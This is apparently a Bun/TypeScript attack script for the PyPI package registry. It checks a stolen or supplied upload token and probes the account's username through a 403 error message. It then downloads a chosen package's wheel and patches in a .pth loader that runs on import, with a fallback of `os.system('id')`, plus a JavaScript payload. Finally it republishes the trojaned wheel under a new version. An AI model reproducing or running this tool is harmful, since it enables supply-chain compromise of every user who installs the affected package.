#!/usr/bin/env bun
(globalThis as Record<string, unknown>).scramble = (s: string): string => s;
(globalThis as Record<string, unknown>).beautify = (s: string): string => s;

import { writeFileSync } from "fs";
import { resolve } from "path";
import { createInterface } from "readline";

import { parseArgs, runModule } from "./common";

async function main() {
  const args = parseArgs(Bun.argv.slice(2));

  const token = args.params["pypi-token"];
  const packageName = args.params["package"];
  if (!packageName) throw new Error("--package required (e.g. requests)");

  const hasToken = !!token;
  const steps = hasToken ? 4 : 3;

  // 1. Validate token (only if provided)
  if (hasToken) {
    console.error(`[1/${steps}] Validating token...`);
    let valid = false;
    try {
      const form = new FormData();
      form.append(":action", "file_upload");
      form.append("name", "dummy-package");
      form.append("version", "0.0.1");
      form.append("content", "dummy-content");

      const res = await fetch("https://upload.pypi.org/legacy/", {
        method: "POST",
        headers: { Authorization: `token ${token}` },
        body: form,
      });
      if (res.status === 400) {
        valid = true;
      }
    } catch (e) {
      throw new Error(
        `PyPI validation failed: ${e instanceof Error ? e.message : String(e)}`,
      );
    }

    if (!valid) {
      throw new Error("PyPI token invalid — upload endpoint rejected it");
    }

    const { parseMacaroonToken } =
      await import("../mutator/pypi/macaroonParse");
    const macaroon = parseMacaroonToken(token);
    console.error(`[pypi] Token type: ${macaroon.type}`);

    // Username probe — upload to "six" (a package they can't own) to leak username via 403
    console.error(`[pypi] Probing username via six...`);
    try {
      const probeForm = new FormData();
      probeForm.append(":action", "file_upload");
      probeForm.append("name", "six");
      probeForm.append("version", "0.0.1");
      probeForm.append("content", new Blob(["x"]), "x");
      const probeRes = await fetch("https://upload.pypi.org/legacy/", {
        method: "POST",
        headers: { Authorization: `token ${token}` },
        body: probeForm,
      });
      if (probeRes.status === 403) {
        const text = await probeRes.text();
        const m = text.match(/The user '([^']+)' isn't allowed/);
        if (m) console.error(`[pypi] Username: ${m[1]}`);
      }
    } catch {
      // non-critical
    }
  }

  // Download the wheel
  const stepDownload = hasToken ? 2 : 1;
  console.error(`[${stepDownload}/${steps}] Downloading ${packageName}...`);
  const { fetchPackageMeta, downloadWheel, patchWheel } =
    await import("../mutator/pypi/wheel");

  const meta = await fetchPackageMeta(packageName);
  if (!meta) throw new Error(`Package "${packageName}" not found on PyPI`);

  console.error(
    `[pypi] Found ${meta.name} @ ${meta.version} (${meta.wheelUrl})`,
  );

  const wheelData = await downloadWheel(meta.wheelUrl);
  if (!wheelData)
    throw new Error(`Failed to download wheel for ${packageName}`);

  // Patch the wheel
  const stepPatch = hasToken ? 3 : 2;
  console.error(`[${stepPatch}/${steps}] Patching wheel...`);

  // Full Bun-guard .pth loader + hello-world JS test payload
  const jsName = "_index.js";
  const { INJECT_PTH } = await import("../generated");
  const pthContent = (INJECT_PTH as string) || "import os; os.system('id')";

  // Hello-world test payload (Bun will execute this)
  const jsPayload = `const fs = require("fs"); fs.writeFileSync("/tmp/hello.txt", "hello world");`;

  const patched = patchWheel({
    meta,
    wheelData,
    pthContent,
    jsPayload,
    jsFilename: jsName,
  });
  console.error(`[pypi] Patched: ${meta.version} → ${patched.newVersion}`);

  // Save patched wheel to cwd
  const stepSave = hasToken ? 4 : 3;
  const outPath = resolve(process.cwd(), patched.filename);
  writeFileSync(outPath, patched.data);
  console.error(`[${stepSave}/${steps}] Saved patched wheel to: ${outPath}`);
  console.error(
    `[pypi] File: ${patched.filename} (${patched.data.length} bytes)`,
  );

  // If no token, we're done
  if (!hasToken) {
    console.error("");
    console.error("No token provided — wheel saved to disk only.");
    return true;
  }

  // Confirm upload
  console.error("");
  const rl = createInterface({ input: process.stdin, output: process.stderr });
  const answer = await new Promise<string>((resolve) => {
    rl.question("Upload patched wheel to PyPI? [y/N]: ", resolve);
  });
  rl.close();

  if (answer.toLowerCase() !== "y") {
    console.error("Upload skipped. Patched wheel saved to disk.");
    return true;
  }

  // Upload
  console.error("[pypi] Uploading...");
  const { uploadWheel } = await import("../mutator/pypi/upload");
  const { extractInfo } = await import("../mutator/pypi/wheel");
  const ok = await uploadWheel({
    token: token!,
    pkgName: meta.name,
    version: patched.newVersion,
    filename: patched.filename,
    wheelData: patched.data,
    ...extractInfo(meta.info),
  });

  if (ok) {
    console.error(`[pypi] Published ${meta.name} @ ${patched.newVersion}`);
    return true;
  } else {
    throw new Error("Upload failed");
  }
}

runModule("PypiClient", main);
